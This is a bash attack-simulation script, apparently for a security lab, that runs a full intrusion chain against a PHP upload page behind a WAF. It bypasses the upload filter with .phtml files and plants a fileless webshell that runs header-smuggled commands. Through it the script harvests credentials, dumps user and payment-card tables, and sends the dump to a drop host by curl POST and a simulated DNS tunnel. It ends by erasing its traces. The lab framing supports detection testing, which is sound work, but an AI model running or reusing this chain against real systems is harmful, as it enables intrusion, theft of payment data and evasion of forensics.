#!/bin/bash
# ============================================================
# Data Exfiltration + Fileless Memory WebShell — WAF Variant
# (数据外泄 + 无文件内存马 攻击链 — 域名版, 经 WAF)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Prerequisites:
#   - DataExfil lab deployed (deploy-91.sh + deploy-92.sh)
#   - WAF domain reachable with valid SSO session cookie
#
# Usage:
#   export WAF_DOMAIN="https://your-waf-domain:port"
#   export WISID_COOKIE="WISID=<your-session-id>"
#   bash attack-domain-waf.sh
#
# Differences from attack.sh (direct IP version):
#   - WAF overwrites X-Real-IP → use X-Debug header instead
#   - WAF blocks .php upload → .phtml bypass
#   - Memory WebShell self-deploys via phtml (write /dev/shm + @include + self-delete)
#
# Covered scenarios: S7 (data exfiltration), S5 (host anomaly)
# ============================================================

set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- Configuration (override via environment variables) ----------
DOMAIN="${WAF_DOMAIN:-https://waf.lab.example:30443}"
# Authentication is optional for an unprotected lab WAF; when configured, pass
# the operator-provided cookie unchanged to every request.
COOKIE="${WISID_COOKIE:-}"
BASE="${DOMAIN}"
P="/exfil"
MEM_TOKEN="c2token2024"
DROP_IP="10.66.6.92"
DROP_PORT="8443"

lab_require_attack_target "${DOMAIN}"
lab_require_attack_target "${DROP_IP}"

# ---------- 工具函数 ----------
get_cst() {
    curl -sk -b "$COOKIE" "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;date" 2>/dev/null \
        | grep -oE '[A-Z][a-z]{2} +[A-Z][a-z]{2} +[0-9]+ [0-9]{2}:[0-9]{2}:[0-9]{2} [A-Z]+ [0-9]{4}'
}

H() { curl -sk -b "$COOKIE" -o /dev/null "$@"; }

log_phase() {
    local ts=$(get_cst)
    echo "[$ts] $1"
}

# 内存马C2通过 upload.php 触发
# X-Debug: body 替代 X-Real-IP (WAF覆盖后者)
MEM_CMD_EXFIL() {
    local cmd="$1"
    local encoded=$(echo -n "$cmd" | base64 -w0)
    local resp=$(curl -sk -b "$COOKIE" \
        -H "X-Forwarded-Port: ${MEM_TOKEN}|${encoded}" \
        -H "X-Debug: body" \
        "${BASE}${P}/upload.php")
    echo "$resp" | sed -n 's/.*<!--MEM:\([A-Za-z0-9+/=]*\):MEM-->.*/\1/p' | base64 -d
}

# ============================================================
echo "============================================"
echo "  DataExfil 无文件攻击 (域名 WAF 版)"
echo "============================================"

# ---------- PHASE 1: 正常流量 ----------
log_phase "开始"
H "${BASE}${P}/"
H "${BASE}${P}/upload.php"
log_phase "P1 正常流量"

# ---------- PHASE 2: 侦察 ----------
for path in /admin /wp-admin /.git/config /.env; do
    H "${BASE}${path}"
done
log_phase "P2 侦察"

# ---------- PHASE 3: 上传探测 ----------
# .jpg 正常上传
echo "test" | curl -sk -b "$COOKIE" \
    -F "file=@-;filename=test.jpg;type=image/jpeg" \
    -o /dev/null "${BASE}${P}/upload.php"

# .php 被WAF拦截
echo "<?php phpinfo();?>" | curl -sk -b "$COOKIE" \
    -F "file=@-;filename=test.php;type=image/jpeg" \
    -o /dev/null "${BASE}${P}/upload.php"

# .phtml 绕过WAF
echo "<?php echo 'PHTML_OK';?>" | curl -sk -b "$COOKIE" \
    -F "file=@-;filename=test.phtml;type=image/jpeg" \
    -o /dev/null "${BASE}${P}/upload.php"

PHTML_VERIFY=$(curl -sk -b "$COOKIE" "${BASE}${P}/uploads/test.phtml" 2>/dev/null)
log_phase "P3 上传探测(.jpg→.php拦截→.phtml绕过) verify=[${PHTML_VERIFY}]"

# ---------- PHASE 4a: 内存马部署 ----------
# 通过 phtml webshell:
#   1. 写内存马到 /dev/shm/.sess_xxxx
#   2. @include 注入 upload.php
#   3. 自删除 phtml 文件
DEPLOY_PHP='<?php
$shell="<?php\nif(isset(\$_SERVER[\"HTTP_X_FORWARDED_PORT\"])){\n\$p=explode(\"|\",\$_SERVER[\"HTTP_X_FORWARDED_PORT\"]);\nif(count(\$p)===2 && \$p[0]===\"c2token2024\"){\n\$c=base64_decode(\$p[1]);\n\$o=shell_exec(\$c.\" 2>&1\");\nif(isset(\$_SERVER[\"HTTP_X_DEBUG\"]) && \$_SERVER[\"HTTP_X_DEBUG\"]===\"body\"){\necho \"<!--MEM:\".base64_encode(\$o).\":MEM-->\";\n}}}\n?".">";
$sn="/dev/shm/.sess_".substr(md5(rand()),0,12);
file_put_contents($sn,$shell);
$f="/var/www/html/exfil/upload.php";
$lines=file($f);
$clean=array_filter($lines,function($l){return strpos($l,"@include")===false;});
array_splice($clean,1,0,["@include(\"$sn\");\n"]);
file_put_contents($f,implode("",array_values($clean)));
echo "DEPLOYED:$sn";
unlink(__FILE__);
?>'

curl -sk -b "$COOKIE" \
    -F "file=@-;filename=deploy.phtml;type=image/jpeg" \
    "${BASE}${P}/upload.php" <<< "$DEPLOY_PHP" > /dev/null 2>&1

DEPLOY_OUT=$(curl -sk -b "$COOKIE" "${BASE}${P}/uploads/deploy.phtml" 2>/dev/null)
SESS_EXFIL=$(echo "$DEPLOY_OUT" | grep -oE '/dev/shm/\.sess_[a-f0-9]+')
log_phase "P4a 内存马部署 ${SESS_EXFIL}"

# ---------- PHASE 4b: 删初始 webshell → 无文件化 ----------
MEM_CMD_EXFIL "rm -f /var/www/html/exfil/uploads/*.phtml /var/www/html/exfil/uploads/*.php /var/www/html/exfil/uploads/*.jpg" > /dev/null
VERIFY=$(MEM_CMD_EXFIL "echo FILELESS_OK")
log_phase "P4b 删初始webshell→无文件 verify=[${VERIFY}]"

# ---------- PHASE 5: 系统侦察 ----------
MEM_CMD_EXFIL "id" > /dev/null
MEM_CMD_EXFIL "uname -a" > /dev/null
MEM_CMD_EXFIL "cat /etc/os-release" > /dev/null
MEM_CMD_EXFIL "ss -tlnp" > /dev/null
log_phase "P5 系统侦察(内存马C2)"

# ---------- PHASE 6: 凭证发现 ----------
MEM_CMD_EXFIL "cat /etc/passwd" > /dev/null
MEM_CMD_EXFIL "find /var/www -name '*.php' -exec grep -l 'password' {} +" > /dev/null
MEM_CMD_EXFIL "cat /var/www/html/sqli/search.php" > /dev/null
log_phase "P6 凭证发现"

# ---------- PHASE 7: 数据库提取 ----------
MEM_CMD_EXFIL "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 -e 'SHOW DATABASES;'" > /dev/null
# Use the same remote database provisioned for direct-IP and WAF variants.
MEM_CMD_EXFIL "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db -e 'SELECT * FROM users;'" > /dev/null
MEM_CMD_EXFIL "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db -e 'SELECT * FROM payment_cards;'" > /dev/null
log_phase "P7 数据库提取(users+payment_cards)"

# ---------- PHASE 8: 数据打包 ----------
MEM_CMD_EXFIL "bash -c 'mysqldump -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db users payment_cards > /tmp/.ex.sql'" > /dev/null
log_phase "P8 数据打包(mysqldump)"

# ---------- PHASE 9: HTTPS 外传 ----------
MEM_CMD_EXFIL "curl -sk -X POST -F 'file=@/tmp/.ex.sql' https://${DROP_IP}:${DROP_PORT}/drop 2>&1 || echo EXFIL_HTTPS" > /dev/null
log_phase "P9 HTTPS外传"

# ---------- PHASE 10: DNS 隧道模拟 ----------
for i in $(seq 1 7); do
    MEM_CMD_EXFIL "curl -sk https://${DROP_IP}:${DROP_PORT}/dns/$(echo -n "chunk${i}_data_exfil" | base64 -w0) 2>&1 || echo DNS_${i}" > /dev/null
done
log_phase "P10 DNS隧道(7 chunks)"

# ---------- PHASE 11: 痕迹清理 ----------
MEM_CMD_EXFIL "rm -f /tmp/.ex.sql" > /dev/null
MEM_CMD_EXFIL "sed -i '/@include/d' /var/www/html/exfil/upload.php" > /dev/null
MEM_CMD_EXFIL "rm -f ${SESS_EXFIL}" > /dev/null
log_phase "P11 痕迹清理"

echo "============================================"
echo "  攻击结束"
echo "============================================"
